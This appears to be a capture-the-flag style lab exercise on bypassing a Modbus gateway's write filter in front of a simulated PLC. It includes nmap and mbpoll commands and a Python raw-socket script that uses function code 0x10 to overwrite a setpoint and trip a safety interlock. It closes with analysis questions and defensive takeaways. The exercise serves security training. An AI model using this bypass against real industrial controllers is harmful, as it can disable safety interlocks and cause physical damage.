# Exercise 1.3: Modbus Gateway Bypass

## Before You Begin

- [ ] Launched the exercise and opened the REMnux/RangeBox desktop
- [ ] A terminal open
- [ ] The **Gateway** address from the panel
- [ ] `python3`, `nmap`, `mbpoll` available

## Scenario

After the setpoint incident in exercise 1.2, Halcyon Industrial placed a Modbus
gateway in front of the HIC-2400 controller. The gateway is the only device on
the lab network. It forwards reads to the PLC and permits single-register
writes only to the batch counter block (holding registers 20-29).

The engineering team believes the setpoint register is now protected. Your job
is to find a write path their allow-list does not inspect, trip the safety
interlock, and recover the maintenance marker.

## Your Objectives

- Confirm only the gateway is reachable
- Read the process registers through the gateway
- Observe a blocked single-register setpoint write
- Find a write function code the gateway does not filter
- Recover the marker after the interlock trips

## Background: gateways and write filters

A Modbus gateway sits between a client and a controller. It can proxy, log, and
filter requests. A write allow-list is only as good as the set of function
codes it inspects.

| Code | Name | Carries an address? |
|------|------|---------------------|
| 0x05 | Write Single Coil | Yes |
| 0x06 | Write Single Register | Yes |
| 0x0F | Write Multiple Coils | Yes, with a count |
| 0x10 | Write Multiple Registers | Yes, with a count and byte count |
| 0x17 | Read/Write Multiple Registers | Yes, read and write ranges |

A gateway that checks only 0x06 lets 0x10 through. Both can change the same
holding register.

## Walkthrough

### Step 1: Confirm the Segmentation

```bash
nmap -sn 10.100.x.0/24
nmap -sV -p 502 <gateway_ip>
```

Only the gateway should answer. The PLC hostname is not on the lab network, so
`plc` does not resolve from your desktop. That is the segmentation working.

### Step 2: Read Through the Gateway

```bash
mbpoll -m tcp -p 502 -t 4 -r 10 -c 4 <gateway_ip>
```

Register 10 should read 20. Register 11 is the measured temperature and changes
as the simulation settles.

### Step 3: Try the Blocked Write

```bash
mbpoll -m tcp -p 502 -t 4 -r 10 <gateway_ip> 250
```

The gateway rejects the request with exception code `0x02` (illegal data
address). The setpoint stays at 20. Confirm with a read.

### Step 4: Use a Multi-Register Write

Function code 0x10 writes a block of holding registers. The gateway forwards it
without checking the address:

```bash
python3 - <<'PY'
import socket, struct, time
ip = "<gateway_ip>"
s = socket.create_connection((ip, 502), 5)

# FC 0x10, start register 10, one register, two bytes, value 250
s.sendall(struct.pack(">HHHBBHHBH", 1, 0, 9, 1, 16, 10, 1, 2, 250))
print("write response:", s.recv(64).hex())

time.sleep(3)

# FC 0x03, start register 40, 40 registers
s.sendall(struct.pack(">HHHBBHH", 2, 0, 6, 1, 3, 40, 40))
r = s.recv(256)
bc = r[8]
vals = struct.unpack(">%dH" % (bc // 2), r[9:9 + bc])
out = "".join(chr(v) for v in vals if 32 <= v < 127)
print(out.split(chr(0))[0])
PY
```

The interlock trips, the pump stops, and the controller writes the marker into
registers 40 and up. Submit the decoded marker as the flag.

### Step 5: Restore the Process (Optional)

The interlock stays tripped until the controller restarts. On a real line,
recovery needs a physical or supervisory reset, not another Modbus write.

## Analysis Questions

**1. Why does segmenting the PLC behind the gateway not stop a determined attacker?**

**2. Which function codes can write holding registers, and how would you filter them by range?**

**3. What would you log at the gateway to detect a bypass attempt?**

**4. Why is a block-list of function codes weaker than decoding the PDU and checking the target range?**

## Defensive Takeaways

- Filter every write function code, not just the one you saw in a sample capture.
- Decode the PDU: check the start address and quantity against the allow-list.
- Reject unknown or unexpected function codes rather than forwarding them.
- Log permitted and rejected writes with client, function code, range, and value.
- Alert when a write targets a safety-critical register or arrives outside a maintenance window.

## If You Get Stuck

- **`plc` does not resolve:** expected. Only the gateway is on the lab network.
- **Exception 0x02:** the gateway rejected a single-register write; that is the lesson.
- **No marker:** the trip needs a few seconds; read registers 40 to 79 after register 11 reads 999.
- **mbpoll not found:** use the raw Python socket methods shown above.
